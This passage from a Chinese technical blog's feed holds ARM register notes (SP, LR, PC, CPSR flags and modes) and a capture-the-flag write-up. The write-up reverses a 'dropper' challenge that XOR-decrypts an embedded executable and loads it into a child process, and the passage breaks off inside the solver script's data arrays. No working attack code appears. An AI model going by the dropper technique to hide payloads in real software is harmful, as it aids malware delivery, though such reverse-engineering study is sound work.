class="code"><pre><span class="line">R13_mode    R14_mode</span><br></pre></td></tr></table></figure><p>其中mode可为:<strong>「usr,fiq,irq,svc,abt,und，mon」</strong>。</p><h3 id="3-寄存器R13（sp）"><a href="#3-寄存器R13（sp）" class="headerlink" title="3. 寄存器R13（sp）"></a><strong>3. 寄存器R13（sp）</strong></h3><p>在ARM指令中常用作<strong>「堆栈指针」</strong>,用户也可使用其他的寄存器作为堆栈指针,而在Thumb指令集中,某些指令强制性的要求使用R13作为堆栈指针。</p><p>寄存器R13在ARM指令中常用作堆栈指针，但这只是一种习惯用法，用户也可使用其他的寄存器作为堆栈指针。而在Thumb指令集中，某些指令强制性的要求使用R13作为堆栈指针。</p><p>由于处理器的每种运行模式均有自己独立的物理寄存器R13，在用户应用程序的初始化部分，一般都要初始化每种模式下的R13，使其指向该运行模式的栈空间。这样，当程序的运行进入异常模式时，可以将需要保护的寄存器放入R13所指向的堆栈，而当程序从异常模式返回时，则从对应的堆栈中恢复，采用这种方式可以保证异常发生后程序的正常执行。</p><h3 id="4-R14（LR）链接寄存器-Link-Register"><a href="#4-R14（LR）链接寄存器-Link-Register" class="headerlink" title="4. R14（LR）链接寄存器(Link Register)"></a><strong>4. R14（LR）链接寄存器(Link Register)</strong></h3><p>当执行子程序调用指令(BL)时,R14可得到R15(程序计数器PC)的备份。</p><p>在每一种运行模式下，都可用R14保存子程序的返回地址，当用BL或BLX指令调用子程序时，将PC的当前值复制给R14，执行完子程序后，又将R14的值复制回PC，即可完成子程序的调用返回。以上的描述可用指令完成。</p><h4 id="从子程序返回："><a href="#从子程序返回：" class="headerlink" title="从子程序返回："></a><strong>从子程序返回：</strong></h4><p><strong>「方法1：」</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  MOV PC, LR</span><br><span class="line">或者</span><br><span class="line">  BX LR</span><br></pre></td></tr></table></figure><p><strong>「方法2：」</strong> 在子程序入口处使用以下指令将R14存入堆栈：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">STMFD SP！,&#123;,LR&#125;</span><br></pre></td></tr></table></figure><p>对应的，使用以下指令可以完成子程序返回：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LDMFD SP！,&#123;,PC&#125;</span><br></pre></td></tr></table></figure><h3 id="5-R15-PC-程序状态寄存器"><a href="#5-R15-PC-程序状态寄存器" class="headerlink" title="5. R15(PC)程序状态寄存器"></a><strong>5. R15(PC)程序状态寄存器</strong></h3><p>寄存器R15用作程序计数器(PC),在ARM状态下,位[1:0]为0,位[31:2]用于保存PC,在Thumb状态下,位[0]为0,位[31:1]用于保存PC。</p><p>比如如果pc的值是0x40008001,那么在寻址的时候其实会查找地址0x40008000，低2位会自动忽略掉。<strong>「个中原因，请读者自己思考?」</strong></p><p>由于ARM体系结构采用了多级流水线技术，对于ARM指令集而言，PC总是指向当前指令的下两条指令的地址,即PC的值为当前指令的地址值加8个字节。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">即：PC值=当前程序执行位置+8</span><br></pre></td></tr></table></figure><h3 id="6-CPSR、SPSR"><a href="#6-CPSR、SPSR" class="headerlink" title="6. CPSR、SPSR"></a><strong>6. CPSR、SPSR</strong></h3><p><strong>「CPSR」</strong>(Current Program Status Register，当前程序状态寄存器)，CPSR可在任何运行模式下被访问，它包括条件标志位、中断禁止位、当前处理器模式标志位，以及其他一些相关的控制和状态位。</p><p>每一种运行模式下又都有一个专用的物理状态寄存器，称为<strong>「SPSR」</strong>(Saved Program Status Register，备份的程序状态寄存器)，当异常发生时，SPSR用于保存CPSR的当前值，从异常退出时则可由SPSR来恢复CPSR。</p><p>由于用户模式和系统模式不属于异常模式，它们没有SPSR，当在这两种模式下访问SPSR，结果是未知的。</p><p>寄存器CPSR格式如下：</p><p><img src="https://pic4.zhimg.com/80/v2-302acba84094b77c3a6496916ace1f33_720w.jpg" class="lazyload" data-srcset="https://pic4.zhimg.com/80/v2-302acba84094b77c3a6496916ace1f33_720w.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><ol><li>条件码标志(condition code flags) <strong>「N,Z,C,V」</strong>均为条件码标志位,它们的内容可被算术或逻辑运算的结果所改变,并且可以决定某条指令是否被执行。 在ARM状态下,绝大多数的指令都是有条件执行的,在Thumb状态下,仅有分支指令是有条件执行的。</li></ol><p><strong>「N (Number)」</strong>: 当用两个补码表示的带符号数进行运算时,N&#x3D;1表示运行结果为负,N&#x3D;0表示运行结果为正或零</p><p><strong>「Z :(Zero)」</strong>: Z&#x3D;1表示运算结果为零,Z&#x3D;0表示运行结果非零</p><p><strong>「C」</strong> : 可以有4种方法设置C的值：</p><ul><li>(Come)加法运算(包括CMP):当运算结果产生了进位时C&#x3D;1,否则C&#x3D;0</li><li>减法运算(包括CMP):当运算产生了借位,C&#x3D;0否则C&#x3D;1</li><li>对于包含移位操作的非加&#x2F;减运算指令 ,C为移出值的最后一位</li><li>对于其他的非加&#x2F;减运算指令C的值通常不改变</li></ul><p><strong>「V」</strong> :<br>(oVerflow)对于加&#x2F;减法运算指令,当操作数和运算结果为二进制的补码表示的带符号位溢出时,V&#x3D;1表示符号位溢出;对于其他的非加&#x2F;减运算指令V的值通常不改变</p><p><strong>「Q」</strong>： 在ARM V5及以上版本的E系列处理器中，用Q标志位指示增强的DSP运算指令是否发生了溢出。在其它版本的处理器中，Q标志位无定义</p><p><strong>「J：」</strong><br>仅ARM v5TE-J架构支持 , T&#x3D;0;J &#x3D; 1 处理器处于Jazelle状态,也可以和其他位组合.</p><p><strong>「E位：」</strong> 大小端控制位</p><p><strong>「A位：」</strong> A&#x3D;1 禁止不精确的数据异常</p><p><strong>「T :」</strong> T &#x3D; 0;J&#x3D;0; 处理器处于 ARM 状态 T &#x3D; 1;J&#x3D;0 处理器处于 Thumb 状态 T &#x3D; 1;J&#x3D;1 处理器处于 ThumbEE 状态</p><ol><li>控制位 CPSR的低8位(包括I,F,T和M[4:0])称为控制位,当发生异常时这些位可以被改变,如果处理器运行特权模式,这些位也可以由程序修改。</li></ol><p><strong>「中断禁止位I,F」</strong>【重要】 I&#x3D;1 禁止IRQ中断 F&#x3D;1 禁止FIQ中断</p><p>比如我们要想在程序中实现禁止中断，那么就需要将CPSR[7]置1。</p><ol><li>运行模式位[4-0]</li></ol><table><thead><tr><th>bite</th><th>模式</th><th>ARM模式可访问的寄存器</th></tr></thead><tbody><tr><td></td><td></td><td></td></tr></tbody></table><p>注意观察这5个bit的特点，最高位都是1，低4位的值则各不相同，这个很重要，要想搞清楚uboot、linux的源码，尤其是异常操作的代码，必须要知道这几个bit的值。</p></div><div class="story post-story"><h2 id="流水线"><a href="#流水线" class="headerlink" title="流水线"></a>流水线</h2><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207011952403.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207011952403.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p></div><div class="story post-story"><h2 id="关键指令"><a href="#关键指令" class="headerlink" title="关键指令"></a>关键指令</h2><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012004599.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012004599.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012012096.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012012096.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012012557.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012012557.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012017047.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012017047.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012021772.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012021772.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012022630.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012022630.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012024984.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012024984.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012029587.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012029587.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012034953.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012034953.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012035407.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012035407.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012036343.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012036343.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012039088.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012039088.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><h4 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h4><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012103481.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012103481.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="C:\Users\25858\AppData\Roaming\Typora\typora-user-images\image-20220701210454467.png" class="lazyload" data-srcset="C:\Users\25858\AppData\Roaming\Typora\typora-user-images\image-20220701210454467.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220701210454467"></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012109930.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012109930.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012111081.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012111081.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012118633.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012118633.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012119566.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012119566.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012119341.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012119341.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012120984.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012120984.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012123335.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012123335.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="C:\Users\25858\AppData\Roaming\Typora\typora-user-images\image-20220701212439179.png" class="lazyload" data-srcset="C:\Users\25858\AppData\Roaming\Typora\typora-user-images\image-20220701212439179.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220701212439179"></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012127963.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012127963.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="C:\Users\25858\AppData\Roaming\Typora\typora-user-images\image-20220701213240392.png" class="lazyload" data-srcset="C:\Users\25858\AppData\Roaming\Typora\typora-user-images\image-20220701213240392.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220701213240392"></p><p><img src="C:\Users\25858\AppData\Roaming\Typora\typora-user-images\image-20220701213334166.png" class="lazyload" data-srcset="C:\Users\25858\AppData\Roaming\Typora\typora-user-images\image-20220701213334166.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220701213334166"></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012133859.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012133859.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012135179.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012135179.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><h4 id="伪代码"><a href="#伪代码" class="headerlink" title="伪代码"></a>伪代码</h4><p><img src="C:\Users\25858\AppData\Roaming\Typora\typora-user-images\image-20220701213618649.png" class="lazyload" data-srcset="C:\Users\25858\AppData\Roaming\Typora\typora-user-images\image-20220701213618649.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220701213618649"></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012136015.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012136015.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="C:\Users\25858\AppData\Roaming\Typora\typora-user-images\image-20220701213813008.png" class="lazyload" data-srcset="C:\Users\25858\AppData\Roaming\Typora\typora-user-images\image-20220701213813008.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220701213813008"></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012139447.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207012139447.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p></div>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> arm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dropper</title>
      <link href="/2022/06/29/dropper/"/>
      <url>/2022/06/29/dropper/</url>
      
        <content type="html"><![CDATA[<p>Dropper</p><p><a href="https://zhuanlan.zhihu.com/p/453020222">什么是Dropper</a></p><p>Dropper是将程序嵌入到自己的内部。</p><p>类似于双进程，运行后解密了资源表的数据，本题是一个exe文件，然后作为子进程被创建了</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206292122746.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206292122746.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p> 开始一个UPX壳，upx -d 的话无法运行 ，手动去壳,试了很多遍， rax会运行错误。</p><p>静态分析：</p><p>（如果不给题目名称如何看出是dropper技术</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206292129407.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206292129407.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>进入，上面几个qword是函数调用但是识别失败。最后一个异或0x73，解密资源的地方，接着主程序后面就是创建一个进程，并把刚刚解密出的pe文件手动装载进行内存，然后恢复执行。</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206292132808.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206292132808.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>下面我们用<a href="https://github.com/glmcdona/Process-Dump">Process-Dump</a>来dump出子程序</p><p><a href="https://cloud.tencent.com/developer/article/1887268">如何使用Process Dump</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pd64.exe -pid ****</span><br></pre></td></tr></table></figure><p>dump出我们需要的子程序，</p><p>主要逻辑为一个int a[500]的数组来实现这个大数的存储及运算</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206292336175.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206292336175.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>这里的第88行*14 通过交叉引用可以推断出是什么，其初始化在Sub_7FF7D0F21433, </p><p>将sub_7FF7D0F2167C的地址赋给前四个字节</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206292348451.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206292348451.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206292336138.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206292336138.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>sub_7FF7D0F2167C函数主要两个功能，对数值的转换，然后check</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206292335337.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206292335337.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>对大数的运算</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206292341512.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202206292341512.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>调试提取数据，有一个除0异常，直接跳过即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">enc = [<span class="number">0x000020F1</span>, <span class="number">0x00001DA9</span>, <span class="number">0x00000156</span>, <span class="number">0x00000B37</span>, <span class="number">0x000007C0</span>, <span class="number">0x0000066A</span>, <span class="number">0x000024E0</span>, <span class="number">0x00000D42</span>, <span class="number">0x00002077</span>, <span class="number">0x000007EC</span>, <span class="number">0x00001BA7</span>, <span class="number">0x00002071</span>, <span class="number">0x000000F8</span>, <span class="number">0x00000291</span>, <span class="number">0x000003DA</span>, <span class="number">0x0000157C</span>, <span class="number">0x00001EF4</span>, <span class="number">0x00002519</span>, <span class="number">0x00000C25</span>, <span class="number">0x00002062</span>, <span class="number">0x00002253</span>, <span class="number">0x00000640</span>, <span class="number">0x000008DF</span>, <span class="number">0x00001E34</span>, <span class="number">0x00002140</span>, <span class="number">0x00000F92</span>, <span class="number">0x0000039B</span>, <span class="number">0x0000126F</span>, <span class="number">0x00002403</span>, <span class="number">0x00000E65</span>, <span class="number">0x000001F0</span>, <span class="number">0x00001868</span>, <span class="number">0x0000016D</span>, <span class="number">0x000006B6</span>, <span class="number">0x00002214</span>, <span class="number">0x00001603</span>, <span class="number">0x00001925</span>, <span class="number">0x000016AE</span>, <span class="number">0x000012D0</span>, <span class="number">0x00001831</span>, <span class="number">0x0000018C</span>, <span class="number">0x00000BF7</span>, <span class="number">0x00000E97</span>, <span class="number">0x000000CE</span>, <span class="number">0x0000061C</span>, <span class="number">0x00000390</span>, <span class="number">0x000019E9</span>, <span class="number">0x000022A5</span>, <span class="number">0x00001601</span>, <span class="number">0x00001A1E</span>, <span class="number">0x000013D1</span>, <span class="number">0x00000DBC</span>, <span class="number">0x0000117D</span>, <span class="number">0x0000225F</span>, <span class="number">0x00002272</span>, <span class="number">0x0000007B</span>, <span class="number">0x000023E6</span>, <span class="number">0x0000069F</span>, <span class="number">0x000002D3</span>, <span class="number">0x00001BEF</span>, <span class="number">0x000003E6</span>, <span class="number">0x000017D4</span>, <span class="number">0x00002284</span>, <span class="number">0x000003B8</span>, <span class="number">0x00000251</span>, <span class="number">0x00001646</span>, <span class="number">0x00000176</span>, <span class="number">0x0000081E</span>, <span class="number">0x000024C3</span>, <span class="number">0x00001E85</span>, <span class="number">0x00001097</span>, <span class="number">0x00001264</span>, <span class="number">0x00000A34</span>, <span class="number">0x00001A3B</span>, <span class="number">0x00000FE7</span>, <span class="number">0x000026A6</span>, <span class="number">0x00001F43</span>, <span class="number">0x00001832</span>, <span class="number">0x000021AE</span>, <span class="number">0x0000023C</span>, <span class="number">0x000004C2</span>, <span class="number">0x00002585</span>, <span class="number">0x000017E7</span>, <span class="number">0x000015DD</span>, <span class="number">0x00002610</span>, <span class="number">0x00001B86</span>, <span class="number">0x00000D2A</span>, <span class="number">0x00000716</span>, <span class="number">0x00001C25</span>, <span class="number">0x00002099</span>]</span><br><span class="line">data = [[<span class="number">0x000024AC</span>, <span class="number">0x00000116</span>, <span class="number">0x000004F4</span>, <span class="number">0x00000B64</span>, <span class="number">0x00001DC3</span>, <span class="number">0x00001B4A</span>, <span class="number">0x000001B2</span>, <span class="number">0x00001FCE</span>, <span class="number">0x00000E81</span>, <span class="number">0x000025AB</span>, <span class="number">0x0000015B</span>, <span class="number">0x0000252D</span>, <span class="number">0x000002AC</span>, <span class="number">0x00000F77</span>, <span class="number">0x000022F5</span>, <span class="number">0x000019E3</span>, <span class="number">0x00001C53</span>, <span class="number">0x00000B66</span>, <span class="number">0x000011BC</span>, <span class="number">0x0000193A</span>],</span><br><span class="line">        [<span class="number">0x00000DC6</span>, <span class="number">0x00000854</span>, <span class="number">0x000015F5</span>, <span class="number">0x00002567</span>, <span class="number">0x000008FA</span>, <span class="number">0x00000E20</span>, <span class="number">0x00000807</span>, <span class="number">0x00001007</span>, <span class="number">0x000018CC</span>, <span class="number">0x00001E84</span>, <span class="number">0x00001F11</span>, <span class="number">0x000013D4</span>, <span class="number">0x0000076A</span>, <span class="number">0x00001461</span>, <span class="number">0x00000B0F</span>, <span class="number">0x00001F70</span>, <span class="number">0x00001B3D</span>, <span class="number">0x00001008</span>, <span class="number">0x00000D52</span>, <span class="number">0x0000049A</span>],</span><br><span class="line">        [<span class="number">0x00001A89</span>, <span class="number">0x00000E42</span>, <span class="number">0x000000FA</span>, <span class="number">0x0000100D</span>, <span class="number">0x000014DD</span>, <span class="number">0x00001BFC</span>, <span class="number">0x000026DB</span>, <span class="number">0x00001AC2</span>, <span class="number">0x00001CA0</span>, <span class="number">0x000005ED</span>, <span class="number">0x00000834</span>, <span class="number">0x000016BF</span>, <span class="number">0x00000704</span>, <span class="number">0x00001FAD</span>, <span class="number">0x000025FD</span>, <span class="number">0x00001142</span>, <span class="number">0x00001EEE</span>, <span class="number">0x00001E60</span>, <span class="number">0x00000353</span>, <span class="number">0x000015A8</span>],</span><br><span class="line">        [<span class="number">0x00000E17</span>, <span class="number">0x00000706</span>, <span class="number">0x00000C1F</span>, <span class="number">0x00000169</span>, <span class="number">0x00002248</span>, <span class="number">0x000007FD</span>, <span class="number">0x00001768</span>, <span class="number">0x00001F54</span>, <span class="number">0x00001574</span>, <span class="number">0x00002458</span>, <span class="number">0x00000374</span>, <span class="number">0x00001D6B</span>, <span class="number">0x00000918</span>, <span class="number">0x00000ECF</span>, <span class="number">0x0000211D</span>, <span class="number">0x00001D96</span>, <span class="number">0x00001BEB</span>, <span class="number">0x00001703</span>, <span class="number">0x00001B87</span>, <span class="number">0x000006FA</span>],</span><br><span class="line">        [<span class="number">0x00000AE3</span>, <span class="number">0x0000069F</span>, <span class="number">0x000001EF</span>, <span class="number">0x00001C15</span>, <span class="number">0x00001378</span>, <span class="number">0x000020D1</span>, <span class="number">0x0000211D</span>, <span class="number">0x00002275</span>, <span class="number">0x000005F4</span>, <span class="number">0x00002475</span>, <span class="number">0x00000D13</span>, <span class="number">0x000008EF</span>, <span class="number">0x00000E10</span>, <span class="number">0x000006D4</span>, <span class="number">0x0000215A</span>, <span class="number">0x000004D6</span>, <span class="number">0x0000202F</span>, <span class="number">0x00001B99</span>, <span class="number">0x00001C86</span>, <span class="number">0x000002F1</span>],</span><br><span class="line">        [<span class="number">0x00000680</span>, <span class="number">0x000000D4</span>, <span class="number">0x00000677</span>, <span class="number">0x00001E21</span>, <span class="number">0x0000220D</span>, <span class="number">0x00000933</span>, <span class="number">0x00000973</span>, <span class="number">0x00001947</span>, <span class="number">0x00000D61</span>, <span class="number">0x0000247F</span>, <span class="number">0x00001D21</span>, <span class="number">0x00001FA2</span>, <span class="number">0x00001606</span>, <span class="number">0x000007B0</span>, <span class="number">0x00001829</span>, <span class="number">0x000016C0</span>, <span class="number">0x000026C9</span>, <span class="number">0x0000248C</span>, <span 